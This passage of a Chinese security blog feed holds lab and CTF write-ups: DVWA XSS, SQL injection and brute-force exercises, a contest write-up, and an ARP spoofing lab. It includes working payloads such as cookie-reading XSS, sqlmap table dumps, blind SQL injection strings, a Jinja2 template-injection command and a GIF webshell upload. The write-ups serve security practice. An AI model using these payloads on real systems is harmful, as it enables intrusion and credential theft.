<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415021852565.png" alt="image-20220415021852565" loading="lazy"></figure>
<p>三段flag拼接即是flag</p>
<h2 id="第一章-web入门粗心的小李">[第一章 web入门]粗心的小李</h2>
<p>题目提示与<code>git相关</code>，下载githack，执行命令</p>
<p>​          <img src="https://z0ekball.github.io/post-images/image-20220415021939161.png" alt="image-20220415021939161" loading="lazy"></p>
<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415021946109.png" alt="image-20220415021946109" loading="lazy"></figure>
<p>打开githack文件下的index.html得到flag</p>
<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415021957944.png" alt="image-20220415021957944" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DVWA练习(XSS)]]></title>
        <id>https://z0ekball.github.io/post/dvwaxss/</id>
        <link href="https://z0ekball.github.io/post/dvwaxss/">
        </link>
        <updated>2021-11-15T15:44:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="xssreflected-low">XSS(Reflected)-Low</h2>
<p>查看源码，对name参数没有任何过滤和检查<br>
​                         <img src="https://z0ekball.github.io/post-images/image-20220415014029290.png" alt="image-20220415014029290" loading="lazy"></p>
<p>输入一段JavaScript代码：<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，返回一个弹窗，攻击成功</p>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415014034811.png" alt="image-20220415014034811" loading="lazy"></figure>
<p>获取cookie:<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415014038390.png" alt="image-20220415014038390" loading="lazy"></figure>
<h2 id="xssreflected-medium">XSS(Reflected)- Medium</h2>
<p>查看源码，发现存在对script的简单过滤，匹配<code>&lt;script&gt;</code>换成null，只执行一次</p>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415014047015.png" alt="image-20220415014047015" loading="lazy"></figure>
<p>采用双写绕过，输入<code>&lt;scr&lt;script&gt;ipt&gt;alert('xss')&lt;/script&gt;</code></p>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415014050608.png" alt="image-20220415014050608" loading="lazy"></figure>
<h2 id="xssreflected-high">XSS(Reflected)-High</h2>
<p>查看源码，采用正则表达式过滤，故无法使用大小写绕过和双写绕过</p>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415014058357.png" alt="image-20220415014058357" loading="lazy"></figure>
<p>换一种标签，输入：<code>&lt;img src=&quot;&quot; onerror=&quot;alert('xss')&quot;&gt;</code>，攻击成功</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415014101999.png" alt="image-20220415014101999" loading="lazy"></figure>
<h2 id="xssstored-low">XSS(Stored)-Low</h2>
<p>输入<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，有弹窗</p>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415014119504.png" alt="image-20220415014107878" loading="lazy"></figure>
<p>输入<code>&lt;a href='' onclick=alert('xss')&gt;click&lt;/a&gt;</code>，设计一个按钮打开弹窗</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415014125565.png" alt="image-20220415014125565" loading="lazy"></figure>
<p>输入<code>&lt;a href=http://www.bilibili.com&gt;click&lt;/a&gt;</code>，按下按钮打开bilibili网页</p>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415014129626.png" alt="image-20220415014129626" loading="lazy"></figure>
<p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，返回页面cookie</p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415014136222.png" alt="image-20220415014136222" loading="lazy"></figure>
<h2 id="xssstored-medium">XSS(Stored)-Medium</h2>
<p>查看源码，message参数把需要转义的字符进行转义防止了xss攻击</p>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415014216650.png" alt="image-20220415014216650" loading="lazy"></figure>
<p>转义结果</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415014144308.png" alt="image-20220415014144308" loading="lazy"></figure>
<p>name参数对<code>&lt;script&gt;</code>有简单过滤，替换第一个<code>&lt;script&gt;</code>，且限制输入10个字符</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415014226987.png" alt="image-20220415014226987" loading="lazy"></figure>
<p>抓包，进行简单绕过</p>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415014233230.png" alt="image-20220415014233230" loading="lazy"></figure>
<p>编码成url</p>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415014238817.png" alt="image-20220415014238817" loading="lazy"></figure>
<p>成功执行</p>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415014242586.png" alt="image-20220415014242586" loading="lazy"></figure>
<p>获取cookie</p>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415014249018.png" alt="image-20220415014249018" loading="lazy"></figure>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415014317151.png" alt="image-20220415014258608" loading="lazy"></figure>
<h2 id="xssstored-high">XSS(Stored)-High</h2>
<p>查看源码，在medium的基础上对script进行严格过滤</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415014343501.png" alt="image-20220415014343501" loading="lazy"></figure>
<p>不使用script即可，输入<code>&lt;a href='' onclick=alert('xss')&gt;click&lt;/a&gt;</code></p>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415014350676.png" alt="image-20220415014350676" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415014357200.png" alt="image-20220415014357200" loading="lazy"></figure>
<p>攻击成功</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415014402390.png" alt="image-20220415014402390" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DVWA练习(SQL Injection)]]></title>
        <id>https://z0ekball.github.io/post/dvwa-lian-xi-sql-injection/</id>
        <link href="https://z0ekball.github.io/post/dvwa-lian-xi-sql-injection/">
        </link>
        <updated>2021-10-26T17:30:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="sql-injection-low">SQL Injection-Low</h2>
<p>抓包<br>
<img src="https://z0ekball.github.io/post-images/image-20220415011925419.png" alt="image-20220415011925419" loading="lazy"></p>
<p>直接用<code>sqlmap</code></p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --dbs
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415011952778.png" alt="image-20220415011952778" loading="lazy"></figure>
<p>说明需要上传cookie，加上抓包的cookie即可</p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; --dbs
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415012023569.png" alt="image-20220415012023569" loading="lazy"></figure>
<p>爆表：</p>
<pre><code class="language-sql">
sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa –tables
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415012047969.png" alt="image-20220415012047969" loading="lazy"></figure>
<p>爆列：</p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa -T users –columns
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415012103755.png" alt="image-20220415012103755" loading="lazy"></figure>
<p>爆字段：</p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa -T users -C user,password –dump
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415012118950.png" alt="image-20220415012118950" loading="lazy"></figure>
<h2 id="sql-injection-medium">SQL Injection-Medium</h2>
<p>抓包，post方式提交数据</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415012132436.png" alt="image-20220415012132436" loading="lazy"></figure>
<p>把包保存到本地，用sqlmap注入</p>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt –dbs查库
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415012146073.png" alt="image-20220415012146073" loading="lazy"></figure>
<p>和low一样的操作查后续信息</p>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa –tables查表
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415012152768.png" alt="image-20220415012152768" loading="lazy"></figure>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa -T users –columns查列
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415012208701.png" alt="image-20220415012208701" loading="lazy"></figure>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post.txt -D dvwa -T users -C user,user_id --dump
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415012222670.png" alt="image-20220415012222670" loading="lazy"></figure>
<h2 id="sql-injection-high">SQL Injection-High</h2>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415012231790.png" alt="image-20220415012231790" loading="lazy"></figure>
<p>抓包，尝试手注</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415012324805.png" alt="image-20220415012324805" loading="lazy"></figure>
<p>回显两个数据，说明有两个注入点</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415012355929.png" alt="image-20220415012355929" loading="lazy"></figure>
<pre><code class="language-sql">查数据库：1' union select 1,database()#
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415012400865.png" alt="image-20220415012400865" loading="lazy"></figure>
<pre><code class="language-sql">查表：1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#，报错
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415012441759.png" alt="image-20220415012441759" loading="lazy"></figure>
<p>没能解决这个问题，换一个思路，用sqlmap</p>
<p>抓包保存，由于题目在弹出的窗口上写入注入语句，在原来的网页回显，所以要设置重定向的网络</p>
<pre><code class="language-sql">sqlmap -r C:\Users\丷木丷\Desktop\post2.txt --second-url &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/&quot; –dbs
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415012454901.png" alt="image-20220415012454901" loading="lazy"></figure>
<p>后续步骤和前面的两题相同</p>
<h2 id="sql-injection-blind-low">SQL Injection (Blind)-Low</h2>
<p>无过滤get盲注</p>
<pre><code class="language-sql">1' and (length(database())&gt;3 and length(database())&lt;5)#
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415012520420.png" alt="image-20220415012520420" loading="lazy"></figure>
<p>说明数据库长度为4</p>
<pre><code class="language-sql">1’ and ascii(substr(database(),1,1))=100#
</code></pre>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415012525108.png" alt="image-20220415012525108" loading="lazy"></figure>
<p>说明数据库第一个字母为d</p>
<p>结合脚本爆破数据库名：</p>
<p>抓包获取url和cookie，加入请求头</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415012554111.png" alt="image-20220415012554111" loading="lazy"></figure>
<p>修改注入字段得到查表脚本：</p>
<pre><code class="language-sql">inner = &quot;?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%u,1))=%u %%23&amp;Submit=Submit#&quot;
</code></pre>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415012622039.png" alt="image-20220415012622039" loading="lazy"></figure>
<h2 id="sql-injection-blind-medium">SQL Injection (Blind)-Medium</h2>
<p>有过滤post盲注</p>
<p>结合burpsuite和脚本进行注入：id=1 and 1=1#&amp;Submit=Submit</p>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415012639939.png" alt="image-20220415012639939" loading="lazy"></figure>
<p>burpsuite爆破库长度</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415012657971.png" alt="image-20220415012657971" loading="lazy"></figure>
<p>简单数字爆破</p>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415012703391.png" alt="image-20220415012703391" loading="lazy"></figure>
<p>返回长度判断长度为4</p>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415012707835.png" alt="image-20220415012707835" loading="lazy"></figure>
<p>脚本爆破库名</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415012745679.png" alt="image-20220415012745679" loading="lazy"></figure>
<p>类似low，爆破表名：</p>
<pre><code class="language-sql">inner = &quot;1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%u,1))=%u #&quot;
</code></pre>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415012802867.png" alt="image-20220415012802867" loading="lazy"></figure>
<h2 id="sql-injection-blind-high">SQL Injection (Blind)-High</h2>
<p>把提交数据和回显数据分开输入与返回，有效加大了脚本注入的难度，采用手注</p>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415012825557.png" alt="image-20220415012825557" loading="lazy"></figure>
<pre><code class="language-sql">1' and length(database())&gt;4#
</code></pre>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415012833176.png" alt="image-20220415012833176" loading="lazy"></figure>
<pre><code class="language-sql">1' and length(database())=4#
</code></pre>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415012847028.png" alt="image-20220415012847028" loading="lazy"></figure>
<p>库名长为4</p>
<p>后续注入和前面相同</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[秋季赛WP]]></title>
        <id>https://z0ekball.github.io/post/qiu-ji-sai-wp/</id>
        <link href="https://z0ekball.github.io/post/qiu-ji-sai-wp/">
        </link>
        <updated>2021-10-20T12:25:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="秋季赛wp">秋季赛WP</h1>
<p>一个人就是一支队伍</p>
<h2 id="web">WEB</h2>
<h3 id="easy-ssti">Easy-ssti</h3>
<p>服务器模板注入，jinja2漏洞，{{7*7}}有回显说明有注入漏洞，_和[被过滤，用require函数结合attr绕过。<br>
Jinja2模板参考<br>
<a href="http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html%23builtin-filters">http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html#builtin-filters</a></p>
<p>注入语句：</p>
<pre><code class="language-php">{{lipsum|attr(request.args.a)|attr(&quot;get&quot;)(request.args.b)|attr(&quot;get&quot;)(&quot;e&quot;+&quot;val&quot;) (request.args.c)}}&amp;a=globals&amp;b=builtins&amp;c=import(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()

&quot;e&quot;+&quot;val&quot; ‘o’+’s’ “编码”.decode(‘base64’)绕过敏感字
</code></pre>
<h3 id="easy-sql1">Easy-sql1</h3>
<p>常规的1’/<strong>/or/</strong>/1&gt;0#和order by之后，经历一番绕过得出能运行的注入语句：</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/database(),2)#&amp;password=
</code></pre>
<p>得到数据库名<br>
<img src="https://z0ekball.github.io/post-images/image-20220414200716689.png" alt="" loading="lazy"></p>
<p>因为=被过滤，不想麻烦绕过就直接爆出整个表名</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/group_concat(table_name),2/**/from/**/information_schema.tables)#&amp;password=
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220414200726337.png" alt="" loading="lazy"></figure>
<p>查找到含flag的表名:flag_table_1</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220414200749595.png" alt="" loading="lazy"></figure>
<p>得flag</p>
<h3 id="easy-ez_upload">Easy-ez_upload</h3>
<p>用御剑扫描目录<br>
<img src="https://z0ekball.github.io/post-images/image-20220414200819812.png" alt="" loading="lazy"><br>
访问/robot.txt<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201035855.png" alt="" loading="lazy"></p>
<p>得文件上传地址,只允许图片上传。用一句话木马攻击，尝试各种方法都没法上传成php格式后,尝试图马。一开始直接把一句话木马写在图片末尾，上传后发现被过滤掉了，考虑二次渲染。网上说png、jpeg不好改，用gif改。用winhex对比原gif和二次渲染过的gif找出相同的字段，插入木马。<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201044815.png" alt="" loading="lazy"><br>
上传图片，木马没有被过滤，但图片还是以gif格式解析，蚁剑无法连接…卡了好久之后看原来黑屏的网页<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201056641.png" alt="" loading="lazy"></p>
<p>明明有提示文件包含我却没看…</p>
<p>利用文件包含漏洞，使gif以php格式解析，访问<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201118117.png" alt="" loading="lazy"><br>
蚁剑终于连接成功<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201126951.png" alt="" loading="lazy"><br>
找不到flag文件，用命令行试试<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201206436.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220414201222636.png" alt="" loading="lazy"></p>
<p>找到flag</p>
<h3 id="medium-web4">Medium-web4</h3>
<p>布尔盲注，感觉出题人应该是个好人，所以猜测是同一个库，尝试题目sql1的注入语句</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<p>回显是good，说明猜对了</p>
<pre><code>username=1'or(length(database())&gt;6)#&amp;password=   good
username=1'or(length(database())&gt;7)#&amp;password=   try again
</code></pre>
<p>库名长度为7，猜应该是cumtctf，脚本爆破验证一下<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201316832.png" alt="" loading="lazy"></p>
<p>没猜错，因为sql1的语句回显是good，猜测flag还是在flag_table_1</p>
<p>因为=被过滤，判断字符用&lt;和&gt;绕过</p>
<pre><code>username=1'or(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,
1)))&gt;0)%26%26(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,
1)))&lt;125)#&amp;password=
</code></pre>
<p>回显good，说明又猜对了，上脚本爆破得flag（脚本绕过语句存在注释符,所以和手注有区别，绕过空格不能用/**/,而用/<em>!</em>/），flag长度猜大一点<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201336573.png" alt="" loading="lazy"></p>
<h2 id="re">RE</h2>
<h3 id="easy-签到">Easy-签到</h3>
<p>ida常规通过字符串找到函数<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201406640.png" alt="" loading="lazy"><br>
16进制解码得flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201446312.png" alt="" loading="lazy"></p>
<h3 id="easy-net">Easy-net</h3>
<p>提示net，因为没有.net环境，无法看运行情况，但用ILSpy能直接反编译函数<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201548593.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220414201600870.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220414201636689.png" alt="" loading="lazy"></p>
<p>大致意思就是一个字符串经过一系列运算，能经过最后一个if判断。逆向爆破可以得到这个字符串，问题是不知道字符串长度。但经过算法OJ题的轮番折磨，我知道array2[j]里的j不能超过该数组长度28（array2有28个数），所以j最大值即字符串长度为28。</p>
<p>这就好办了，上脚本爆破得flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201654601.png" alt="" loading="lazy"></p>
<h2 id="pwn">PWN</h2>
<h3 id="easy-pwn1">Easy-pwn1</h3>
<p>Nc一下，cat flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201725664.png" alt="" loading="lazy"></p>
<h3 id="easy-pwn2">Easy-pwn2</h3>
<p>标准栈溢出，buf是0x40h但要读入0x60h的数据，参考攻防世界栈溢出的题解写脚本<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201801302.png" alt="" loading="lazy"><br>
Call system地址<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201819493.png" alt="" loading="lazy"><br>
填充0x48覆盖buf和push内容，再覆盖返回地址，脚本：<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201828914.png" alt="" loading="lazy"><br>
执行<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201839150.png" alt="" loading="lazy"></p>
<h3 id="easy-pwn3">Easy-pwn3</h3>
<p>exeinfo查了一下, 32位<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201911585.png" alt="" loading="lazy"></p>
<p>用ida32打开，通过字符串找到函数<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201924140.png" alt="" loading="lazy"></p>
<p>查资料时发现博客</p>
<p><a href="https://blog.csdn.net/weixin_44145820/article/details/105482269">(10条消息) BUUCTF-PWN刷题记录-6_L.o.W的博客-CSDN博客</a></p>
<p>不能说毫无相关，简直就是一模一样…</p>
<p>先填充满缓冲区，泄露ebp，然后使用栈迁移执行system，运行得flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414201935583.png" alt="" loading="lazy"></p>
<h2 id="crypto">Crypto</h2>
<h3 id="easy-签到-2">Easy-签到</h3>
<p>逆向爆破，懒得判断数字和符号，爆出来再加上就是flag</p>
<p>脚本<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202014958.png" alt="" loading="lazy"><br>
加上数字和符号<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202025543.png" alt="" loading="lazy"></p>
<h3 id="easy-lcg">Easy-lcg</h3>
<p>LCG就是线性同余法，得到的是弱伪随机数，参考lcg教程</p>
<p>http://www.manongjc.com/detail/22-hpzrquvdaforjqj.html</p>
<p>参考里面的脚本，运行得到flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202049990.png" alt="" loading="lazy"></p>
<h2 id="misc">Misc</h2>
<h3 id="easy-签到-3">Easy-签到</h3>
<p>base32解密<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202112612.png" alt="" loading="lazy"></p>
<h3 id="easy-lsb">Easy-LSB?</h3>
<p>LSB隐写，Stegslove多次尝试修改低位的0、1，如图拿到flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202129805.png" alt="" loading="lazy"></p>
<h3 id="easy-压缩包">Easy-压缩包</h3>
<p>有点阴间的题目，第一个压缩包就是伪加密，HXD打开修改全局方式位标记为00 00，能够打开压缩包，得到下一个压缩包。HXD查看是真加密，根据提示用ziperello爆破得密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202148412.png" alt="" loading="lazy"></p>
<p>又得到了真两个加密文件，卡了好久之后想起加密的图在别的题里有原图，对比两这的冗余码，确认是同一个文件。一个已知解密文件和一个相同的加密文件不就是明文攻击嘛。</p>
<p>把已知图片压缩成包，ARCHPR明文攻击得密码，解开的flag<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202156116.png" alt="" loading="lazy"></p>
<h3 id="easy-加密">Easy-加密？</h3>
<p>套娃加密题，图片是福尔摩斯密码，解密得到密码SHERLOCK</p>
<p>第二个压缩包的txt文件是零宽字符加密，解密得密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202220004.png" alt="" loading="lazy"></p>
<p>打开flag文件, base16解密<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202227205.png" alt="" loading="lazy"></p>
<h3 id="medium-社工">Medium-社工？</h3>
<p>一开始用微信QQ扫码都没用，就着jpeg研究了好久还是解不出，直到我知道一个叫中国编码的东东…<br>
<img src="https://z0ekball.github.io/post-images/image-20220414202251180.png" alt="" loading="lazy"></p>
<p>WANG/JIA就是这个人的名字，也就拿到了flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ARP欺骗实验]]></title>
        <id>https://z0ekball.github.io/post/arp-qi-pian-shi-yan/</id>
        <link href="https://z0ekball.github.io/post/arp-qi-pian-shi-yan/">
        </link>
        <updated>2021-10-14T15:59:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2>
<p><code>网关</code>：IP:192.168.89.2     MAC: 00:50:56:fd:c6:0f</p>
<p><code>攻击机</code>：IP: 192.168.89.129   MAC: 00:0c:29:e8:f7:fa<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235504335.png" alt="" loading="lazy"></p>
<p><code>靶机</code>：IP：192.168.89.130   MAC：00:0c:29:2f:af:50<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235510538.png" alt="" loading="lazy"></p>
<p>攻击机fping -g查看存活主机<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235516996.png" alt="" loading="lazy"></p>
<p>查勘表靶机arp缓存表<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235520684.png" alt="" loading="lazy"></p>
<h2 id="攻击过程">攻击过程</h2>
<p>使用<code>arping</code>进行攻击</p>
<pre><code>arping -S 192.168.89.2 -s 00:00:00:00:00:00 192.168.89.130
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220414235527380.png" alt="" loading="lazy"></figure>
<p>靶机ping baidu.com失败<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235624766.png" alt="" loading="lazy"></p>
<p>arp -a查看mac地址，网关已改变，攻击成功<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235632373.png" alt="" loading="lazy"></p>
<p>只要把网关MAC改为正确地址，即可解除攻击<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235656428.png" alt="" loading="lazy"></p>
<p>靶机正常访问baidu.com，网关MAC正常<br>
<img src="https://z0ekball.github.io/post-images/image-20220414235651949.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DVWA练习(Brute-Force)]]></title>
        <id>https://z0ekball.github.io/post/dvwa-lian-xi-brute-force/</id>
        <link href="https://z0ekball.github.io/post/dvwa-lian-xi-brute-force/">
        </link>
        <updated>2021-09-29T08:03:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="brute-force-low">Brute Force-Low</h2>
<p><img src="https://z0ekball.github.io/post-images/image-20220415005815758.png" alt="" loading="lazy"><br>
随便输入，burpsuite抓取，发送到instuder，选取爆破目标<br>
<img src="https://z0ekball.github.io/post-images/image-20220415005820686.png" alt="" loading="lazy"><br>
选择爆破方式，这里选择<code>Cluster bomb</code>适用于两个参数的爆破<br>
<img src="https://z0ekball.github.io/post-images/image-20220415005825553.png" alt="" loading="lazy"><br>
分别设置两个参数的爆破格式，选择<code>simple list</code>，添加爆破字典<br>
<img src="https://z0ekball.github.io/post-images/image-20220415005836345.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415005832746.png" alt="" loading="lazy"><br>
开始爆破，length降序排序找到唯一不同的页面，就是账号和密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220415005840823.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415005851995.png" alt="" loading="lazy"></p>
